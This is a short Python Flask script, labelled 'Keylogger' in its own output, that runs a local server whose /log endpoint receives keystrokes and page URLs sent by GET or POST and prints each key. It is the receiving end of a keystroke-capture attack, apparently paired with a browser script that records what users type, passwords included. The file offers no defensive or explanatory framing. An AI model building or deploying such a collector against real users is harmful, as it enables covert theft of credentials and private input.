from flask import Flask, request
from datetime import datetime

app = Flask(__name__)


@app.route('/log', methods=['GET', 'POST'])
def log_key():
    if request.method == 'GET':
        key = request.args.get('key', '')
        url = request.args.get('url', 'unknown')
    else:
        key = request.form.get('key', '')
        url = request.form.get('url', 'unknown')
    
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    #print(f"[{timestamp}] Key pressed: '{key}' on {url}")
    print(key)
    return '', 204


if __name__ == '__main__':
    print("Keylogger")
    app.run(host='127.0.0.1', port=8000, debug=False)
